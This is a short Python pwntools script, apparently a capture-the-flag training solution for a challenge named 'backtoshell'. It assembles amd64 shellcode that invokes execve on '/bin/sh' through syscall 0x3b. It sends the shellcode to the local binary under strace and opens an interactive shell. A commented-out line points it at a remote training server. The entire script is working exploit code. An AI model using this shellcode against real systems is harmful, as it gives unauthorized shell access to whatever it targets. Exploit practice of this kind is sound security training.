from pwn import *

asm_code = """
mov rdi, rax
add rdi, 16
mov rax, 0x3b
syscall
.string "/bin/sh"
nop
nop
nop
nop
"""

context.arch = 'amd64'


shellcode = asm(asm_code)

p = process(["strace", "./backtoshell"])
#p = remote("bin.training.offdef.it", 3001)
p.send(shellcode)

p.interactive()
